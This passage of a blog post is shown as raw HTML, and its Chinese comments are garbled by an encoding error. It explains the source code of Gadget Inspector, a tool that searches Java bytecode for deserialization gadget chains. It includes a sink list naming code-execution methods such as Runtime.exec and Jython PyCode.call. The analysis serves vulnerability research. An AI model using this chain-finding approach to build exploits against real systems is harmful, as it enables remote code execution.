  <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    <span class="comment">// åŠ è½½é‡å†™ä¿¡æ¯ï¼šæ–¹æ³•-&gt;é‡å†™æ–¹æ³•é›†åˆ</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">            inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç›®æ ‡æ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™æ–¹æ³•ï¼ˆåŒ…æ‹¬ç›®æ ‡æ–¹æ³•æœ¬èº«ï¼‰</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ImplementationFinder</span> <span class="variable">implementationFinder</span> <span class="operator">=</span> config.getImplementationFinder(</span><br><span class="line">            methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜é‡å†™ä¿¡æ¯åˆ° methodimpl.datï¼šï¼ˆç¼©è¿›ï¼‰ç±»å æ–¹æ³•å æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">            writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getDesc());</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ è½½è°ƒç”¨å…³ç³»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory())) &#123;</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">caller</span> <span class="operator">=</span> graphCall.getCallerMethod();</span><br><span class="line">        <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">            Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            graphCalls.add(graphCall);</span><br><span class="line">            graphCallMap.put(caller, graphCalls);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graphCallMap.get(caller).add(graphCall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å·²ç»è®¿é—®è¿‡çš„æ–¹æ³•ï¼ˆèŠ‚ç‚¹ï¼‰</span></span><br><span class="line">    Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// å¾…åˆ†æçš„é“¾</span></span><br><span class="line">    LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// åŠ è½½æ‰€æœ‰ sourcesï¼Œå¹¶å°†æ¯ä¸ª source åˆ†åˆ«ä½œä¸ºé“¾çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory())) &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºèŠ‚ç‚¹</span></span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">srcLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">        <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä»…æœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„é“¾</span></span><br><span class="line">        methodsToExplore.add(<span class="keyword">new</span> <span class="title class_">GadgetChain</span>(Arrays.asList(srcLink)));</span><br><span class="line">        <span class="comment">// å°†æ–¹æ³•æ ‡è®°ä¸ºå·²è®¿é—®</span></span><br><span class="line">        exploredMethods.add(srcLink);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯æ¬¡æ•°</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">iteration</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ä¿å­˜æ‰¾åˆ°çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// BFS æœç´¢ source åˆ° sink çš„åˆ©ç”¨é“¾</span></span><br><span class="line">    <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">        &#125;</span><br><span class="line">        iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">GadgetChain</span> <span class="variable">chain</span> <span class="operator">=</span> methodsToExplore.pop(); <span class="comment">// å–å‡ºä¸€æ¡é“¾</span></span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">lastLink</span> <span class="operator">=</span> chain.links.get(chain.links.size() - <span class="number">1</span>); <span class="comment">// å–è¿™æ¡é“¾æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ–¹æ³•ä¸å…¶è¢«è°ƒæ–¹æ³•çš„è°ƒç”¨å…³ç³»</span></span><br><span class="line">        Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">        <span class="keyword">if</span> (methodCalls != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœå½“å‰æ–¹æ³•çš„æ±¡æŸ“å‚æ•°ä¸è¢«è°ƒæ–¹æ³•å—æ–¹æ³•å‚æ•°å½±å“çš„ç´¢å¼•ä¸ä¸€è‡´åˆ™è·³è¿‡ï¼ˆå³ç¬¬ index ä¸ªå‚æ•°ï¼‰</span></span><br><span class="line">                <span class="comment">// åˆ¤æ–­ source æ—¶ï¼Œç´¢å¼•æŒ‡å‡ºèƒ½å¤Ÿè¢«æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°</span></span><br><span class="line">                <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è·å–è¢«è°ƒæ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™ä¿¡æ¯</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// éå†è¢«è°ƒæ–¹æ³•çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                    <span class="type">GadgetChainLink</span> <span class="variable">newLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                    <span class="comment">// å¦‚æœè¢«è°ƒæ–¹æ³•å·²ç»è¢«è®¿é—®è¿‡äº†ï¼Œåˆ™è·³è¿‡ï¼Œå‡å°‘å¼€é”€</span></span><br><span class="line">                    <span class="comment">// ä½†æ˜¯è·³è¿‡ä¼šä½¿å…¶ä»–é“¾åœ¨ç»è¿‡æ­¤èŠ‚ç‚¹æ—¶æ–­æ‰</span></span><br><span class="line">                    <span class="comment">// è€Œå»æ‰è¿™æ­¥å¯èƒ½ä¼šé‡åˆ°ç¯çŠ¶é—®é¢˜ï¼Œé€ æˆè·¯å¾„æ— é™å¢åŠ </span></span><br><span class="line">                    <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// æ–°èŠ‚ç‚¹ï¼ˆè¢«è°ƒæ–¹æ³•ï¼‰ä¸ä¹‹å‰çš„é“¾ç»„æˆæ–°é“¾</span></span><br><span class="line">                    <span class="type">GadgetChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChain</span>(chain, newLink);</span><br><span class="line">                    <span class="comment">// åˆ¤æ–­è¢«è°ƒæ–¹æ³•æ˜¯å¦ä¸º sink ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™åŠ å…¥åˆ©ç”¨é“¾é›†åˆ</span></span><br><span class="line">                    <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                        discoveredGadgets.add(newChain);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// å¦åˆ™å°†æ–°é“¾åŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆï¼Œè¢«è°ƒæ–¹æ³•åŠ å…¥å·²è®¿é—®çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">                        methodsToExplore.add(newChain);</span><br><span class="line">                        exploredMethods.add(newLink);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æœç´¢åˆ°çš„åˆ©ç”¨é“¾ä¿å­˜åˆ° gadget-chains.txt</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">         <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">            printGadgetChain(writer, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSink</code> æ–¹æ³•åˆ¤æ–­æ–¹æ³•ï¼ˆå’Œå‚æ•°ï¼‰æ˜¯å¦è§¦å‘é¢„å®šä¹‰çš„ JDK ä¸­çš„ sink ç‚¹ï¼Œæ¯”å¦‚ <code>Runtime.exec</code> æ–¹æ³•ã€‚ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é¢„å®šä¹‰çš„ sink ç‚¹</span></span><br><span class="line"><span class="comment"> * Represents a collection of methods in the JDK that we consider to be &quot;interesting&quot;. If a gadget chain can</span></span><br><span class="line"><span class="comment"> * successfully exercise one of these, it could represent anything as mundade as causing the target to make a DNS</span></span><br><span class="line"><span class="comment"> * query to full blown RCE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method            æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argIndex          å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap    ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Parameterize this as a configuration option</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isSink</span><span class="params">(MethodReference.Handle method, <span class="type">int</span> argIndex, InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>printGadgetChain</code> æ–¹æ³•ç”¨äºè¾“å‡ºåˆ©ç”¨é“¾ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†åˆ©ç”¨é“¾å†™å…¥æ–‡ä»¶ï¼šï¼ˆç¼©è¿›ï¼‰ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ ä¼ é€’æ±¡ç‚¹çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> writer å†™å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> chain  åˆ©ç”¨é“¾</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printGadgetChain</span><span class="params">(Writer writer, GadgetChain chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    writer.write(String.format(<span class="string">&quot;%s.%s%s (%d)%n&quot;</span>,    <span class="comment">// æ±¡ç‚¹æº</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getClassReference().getName(),    <span class="comment">// ç±»å</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getName(),    <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).method.getDesc(),    <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">            chain.links.get(<span class="number">0</span>).taintedArgIndex));   <span class="comment">// æ±¡ç‚¹å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; chain.links.size(); i++) &#123;  <span class="comment">// åˆ©ç”¨é“¾</span></span><br><span class="line">        writer.write(String.format(<span class="string">&quot;  %s.%s%s (%d)%n&quot;</span>,</span><br><span class="line">                chain.links.get(i).method.getClassReference().getName(),</span><br><span class="line">                chain.links.get(i).method.getName(),</span><br><span class="line">                chain.links.get(i).method.getDesc(),</span><br><span class="line">                chain.links.get(i).taintedArgIndex));</span><br><span class="line">    &#125;</span><br><span class="line">    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-ç»“è¯­"><a href="#0x04-ç»“è¯­" class="headerlink" title="0x04 ç»“è¯­"></a>0x04 ç»“è¯­</h1><p>æµ‹è¯•æ—¶å‘ç° Gadget Inspector æ— æ³•åˆ†æç”¨ Java16 ç”Ÿæˆçš„ jar åŒ…ï¼Œå¬è¯´ Java8 çš„å…¼å®¹æ€§æ¯”è¾ƒå¥½ï¼Œå°è¯•ä½¿ç”¨ Java8 æ‰“åŒ…ï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œåˆ†æï¼Œä¹‹åå†è¡¥å……ä¾‹å­ã€‚</p><p>è¿™ä¸ªå·¥å…·å¾ˆæ˜æ˜¾æ— æ³•æœç´¢æ‰€æœ‰çš„åˆ©ç”¨é“¾ï¼Œä¸ºäº†é¿å…è·¯å¾„çˆ†ç‚¸å¯¹æ¯ä¸ªæ–¹æ³•åªè®¿é—®ä¸€æ¬¡ï¼Œå¯ä»¥ç”¨æœ€å¤§æ·±åº¦é™åˆ¶ä¿®æ”¹ï¼›å¦å¤–ä¹Ÿæœ‰æ–‡ç« åˆ†æè¡¨ç¤ºç”Ÿæˆçš„è°ƒç”¨å…³ç³»ä¸å¤Ÿå…¨ï¼Œæˆ‘æ²¡æœ‰éªŒè¯è¿‡ï¼›æ‰©å……çš„è¯å¯ä»¥ä»æ·»åŠ  source&#x2F;sink ç‚¹ï¼ˆè§„åˆ™ï¼‰å¼€å§‹ï¼Œä¹Ÿæœ‰äººæ‰©å……äº†å¯¹ SQL æ³¨å…¥ï¼ˆWebï¼‰çš„æ£€æµ‹ä¹‹ç±»çš„ã€‚</p><p>å½“ç„¶è¿˜æ˜¯å…ˆç†Ÿæ‚‰å·¥å…·çš„è¿è¡ŒåŸç†ï¼Œç”¨ç®€å•çš„ç¨‹åºæµ‹è¯•ä¹‹åï¼Œå†æ‹¿å®é™…ä¾‹å­ï¼ˆæ¯”å¦‚ ysoserialï¼‰æµ‹ï¼Œéš¾é¡¶ğŸ¤¯ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">å­—èŠ‚ç å¢å¼ºæŠ€æœ¯æ¢ç´¢</a></li><li><a href="https://zhuanlan.zhihu.com/p/45354152">Javaè™šæ‹Ÿæœºâ€”æ ˆå¸§ã€æ“ä½œæ•°æ ˆå’Œå±€éƒ¨å˜é‡è¡¨</a></li><li><a href="https://docs.oracle.com/javase/specs/index.html">Java Language and Virtual Machine Specifications</a></li><li><a 